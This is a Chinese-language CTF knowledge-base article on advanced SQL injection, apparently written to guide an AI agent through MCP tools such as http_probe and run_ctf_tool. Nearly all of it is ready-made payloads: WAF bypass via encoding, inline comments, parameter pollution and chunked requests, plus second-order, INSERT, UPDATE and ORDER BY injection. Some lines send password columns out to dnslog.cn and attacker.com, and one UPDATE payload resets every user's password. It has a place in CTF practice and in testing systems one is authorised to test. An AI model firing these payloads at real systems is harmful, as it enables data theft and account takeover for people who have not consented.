---
id: "ctf-website/24-database/02-sqli-advanced"
title: "Advanced SQLi & WAF Bypass — 高级注入与绕过技术"
title_en: "Advanced SQLi & WAF Bypass"
summary: >
  WAF深度绕过、二阶SQL注入、OOB带外注入（DNS/HTTP/SMB）、INSERT/UPDATE/DELETE注入、ORDER BY/LIMIT注入等当基础手法的进阶武器库。涵盖HTTP层绕过（HPP分块传输multipart）、编码绕过（Hex/CHAR/宽字节）和函数等价替换技术。
summary_en: >
  Advanced SQLi arsenal for when basic techniques are blocked: deep WAF bypass, second-order SQL injection, OOB out-of-band injection (DNS/HTTP/SMB), INSERT/UPDATE/DELETE injection, ORDER BY/LIMIT injection. Covers HTTP-layer bypass (HPP, chunked, multipart), encoding bypass (Hex/CHAR/wide-byte), and function equivalence substitution.
board: "ctf-website"
category: "24-database"
signals:
  - "二阶注入 second-order SQLi"
  - "OOB DNS 带外 DNSLog"
  - "HPP HTTP 参数污染"
  - "分块传输 Transfer-Encoding chunked"
  - "multipart 绕过 WAF"
  - "INSERT UPDATE DELETE 注入"
  - "ORDER BY 注入 CASE WHEN"
  - "内联注释 /*!50000SELECT*/"
mcp_tools:
  - "http_probe"
  - "run_ctf_tool"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "高级 SQL 注入"
  - "二阶注入"
  - "OOB 带外"
  - "DNSLog"
  - "WAF 深度绕过"
  - "HPP 参数污染"
  - "分块传输"
  - "INSERT 注入"
  - "ORDER BY 注入"
  - "宽字节绕过"
difficulty: "advanced"
tags:
  - "database"
  - "sql-injection"
  - "waf-bypass"
  - "oob"
  - "second-order"
  - "advanced"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Advanced SQLi & WAF Bypass — 高级注入与绕过技术

> WAF 绕过、二阶注入、OOB 带外、ORDER BY/INSERT/UPDATE 注入——当基础手法被拦截时的进阶武器库。

## 关键词

`WAF绕过` `二阶SQL注入` `OOB带外注入` `DNSLog` `ORDER BY注入` `INSERT注入` `UPDATE注入` `宽字节注入` `GBK绕过` `multipart绕过` `HPP` `HTTP参数污染` `chunked编码` `分块传输`

## 1. WAF 深度绕过

### 1.1 等价运算符

```sql
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN / IN / < >
空格→ /**/ / %09 / %0a / %0d / %0c / %a0 / +
```

### 1.2 HTTP 层绕过

```http
# HPP (HTTP Parameter Pollution)
GET /?id=1&id=2 UNION SELECT 1,2,3--

# 分块传输
POST /api HTTP/1.1
Transfer-Encoding: chunked

1
i
1
d
0
=1 UNION SELECT 1,2--

# multipart 绕过
Content-Type: multipart/form-data; boundary=----
```

### 1.3 函数等价替换

```sql
-- SLEEP 替换
SLEEP(3) → BENCHMARK(5000000,MD5(1))
SLEEP(3) → (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.columns C)

-- GROUP_CONCAT 替换
GROUP_CONCAT(col) → (SELECT GROUP_CONCAT(col) FROM ...)

-- database() 替换
database() → SCHEMA()

-- 字符串拼接
CONCAT(a,b) → CONCAT_WS('',a,b)

-- 子查询绕过
SELECT ... FROM ... → 使用表别名 + 多重嵌套
```

### 1.4 编码绕过

```sql
-- Hex 编码
SELECT 0x3f3f3f
INSERT INTO users VALUES (0x61646d696e, 0x70617373)

-- CHAR() 编码
SELECT CHAR(115,101,108,101,99,116) → 'select'

-- 宽字节 (GBK/GB2312)
%bf%27 → 縗' (0xbf5c = GBK字符, 0x27 = 未转义引号)
%df%27 → 運'
%aa%27 → 猻'
```

### 1.5 内联注释绕过

```sql
/*!50000SELECT*/     -- MySQL >= 5.0.0
/*!50726SELECT*/     -- MySQL >= 5.7.26
```

## 2. 二阶 SQL 注入

### 2.1 原理

恶意数据先存储到数据库（绕过第一层 WAF），后在另一处查询时触发。

```
用户注册 → username="admin'--" → 存入数据库
修改密码 → UPDATE users SET pass='xxx' WHERE username='admin'--'
         → WHERE 条件被注释 → 修改了所有用户密码
```

### 2.2 常见注入点

```sql
-- 注册时注入 username
INSERT INTO users (username) VALUES ('admin'--')

-- 订单提交时注入 input 字段
INSERT INTO orders (input) VALUES ('1' UNION SELECT 1,2,3--')

-- 读取时触发
SELECT * FROM orders WHERE input = '1' UNION SELECT 1,2,3--'
```

## 3. OOB 带外注入 (Out-of-Band)

### 3.1 DNS 带外 (MySQL, Windows)

```sql
-- 数据库名外带
SELECT LOAD_FILE(CONCAT('\\\\',database(),'.dnslog.cn\\a'))

-- 表名外带
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables LIMIT 0,1),'.dnslog.cn\\a'))

-- 数据外带
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.dnslog.cn\\a'))
```

### 3.2 HTTP 带外 (Oracle)

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL
```

### 3.3 SMB 带外 (MSSQL)

```sql
EXEC xp_dirtree '\\attacker.com\share',1,1
```

## 4. INSERT 注入

```sql
-- 报错注入
INSERT INTO users VALUES ('admin','1' AND extractvalue(1,concat(0x7e,database()))--','1')

-- 时间注入
INSERT INTO users VALUES ('admin','1' AND (SELECT SLEEP(3))--','1')

-- 子查询注入
INSERT INTO users VALUES ('admin',(SELECT password FROM users LIMIT 0,1),'1')
```

## 5. UPDATE 注入

```sql
-- 修改其他用户密码
UPDATE users SET password='newpass' WHERE username='admin' OR '1'='1'

-- 报错提取
UPDATE users SET password='new' WHERE username='admin' AND extractvalue(1,concat(0x7e,database()))--

-- 时间盲注
UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
```

## 6. ORDER BY 注入

```sql
-- 布尔盲注
?order=username ASC
?order=(CASE WHEN (1=1) THEN username ELSE password END)

-- 时间盲注
?order=(SELECT IF(1=1,SLEEP(3),0))

-- 报错注入
?order=extractvalue(1,concat(0x7e,database()))

-- 联合查询 (需要括号闭合)
?order=(SELECT 1 UNION SELECT 2)
```

## 7. LIMIT / OFFSET 注入 (PostgreSQL)

```sql
?limit=1 UNION SELECT 1,2,3--
```

## 8. PROCEDURE ANALYSE 注入

```sql
?id=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--
```

## 攻击链 / 工作流

```
1. 复用基础 SQLi 证据，确认注入点、闭合方式、DBMS 和过滤规则
2. 分层测试绕过：HTTP 参数污染/分块 → 编码 → 注释 → 函数等价 → 语法变形
3. 无直接回显时切换到二阶注入、OOB DNS/HTTP/SMB 或时间盲注
4. 将 INSERT/UPDATE/ORDER BY/LIMIT 等非 SELECT 场景分别建模，避免套用单一 payload
5. 对每种绕过只保留最小可验证 payload，并记录触发条件
6. 如果 payload 需要外带通道，保存 DNS/HTTP listener 原始日志作为证据
7. 输出 WAF 规则假设、可绕过语法族和修复建议（参数化 + allowlist）
```

## Evidence

| 场景 | 证据 |
|------|------|
| WAF 绕过 | 拦截前 payload、绕过后 payload、状态码/响应差异 |
| 二阶注入 | 写入点请求、触发点请求、延迟或报错输出 |
| OOB 注入 | DNS/HTTP/SMB listener 日志、唯一 token |
| 非 SELECT 注入 | INSERT/UPDATE/ORDER BY/LIMIT 的最小触发语句 |
| 修复验证 | 参数化后同 payload 不再改变 SQL 语义 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 WAF bypass、second-order、OOB SQLi 搜索 |
| HTTP 探测 | `http_probe` | 验证 payload 差异、延迟和状态码 |
| 工具执行 | `run_ctf_tool` | 调用 sqlmap tamper、dnslog/自定义脚本 |
| 证据记录 | `workspace_write_text` | 保存绕过矩阵和外带日志 |

## 9. 关联技术

- [[01-sqli-fundamentals]] — SQL 注入基础
- [[03-nosql-injection]] — NoSQL 注入
- [[06-card-platform]] — 发卡平台实战
- [[sqli-nosqli]] — SQL/NoSQL 注入
